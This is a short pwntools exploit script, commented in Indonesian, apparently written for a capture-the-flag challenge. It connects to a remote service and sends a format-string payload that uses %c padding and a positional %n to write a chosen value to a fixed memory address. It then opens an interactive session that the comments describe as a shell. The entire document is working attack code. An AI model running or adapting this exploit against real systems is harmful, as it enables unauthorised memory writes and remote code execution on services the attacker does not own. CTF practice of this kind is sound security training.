from pwn import *

# === PILIH TARGET ===
# io = process('./vuln') 
io = remote('target-ctf.id', 1234)

# === DATA EXPLOIT ===
addr_target = 0x0804a018  # Alamat A
nilai_v = 65              # Nilai yang mau ditulis (V)
k = 7                     # Offset yang didapet dari script 1

# === RAKIT PAYLOAD (Formula Lu) ===
# p32(A) memakan 4 karakter, jadi paddingnya V - 4
payload = p32(addr_target) 
payload += f"%{nilai_v - 4}c".encode()
payload += f"%{k}$n".encode()

log.info(f"Mengirim Payload: {payload}")

# Kirim dan dapet shell
io.sendline(payload)
io.interactive()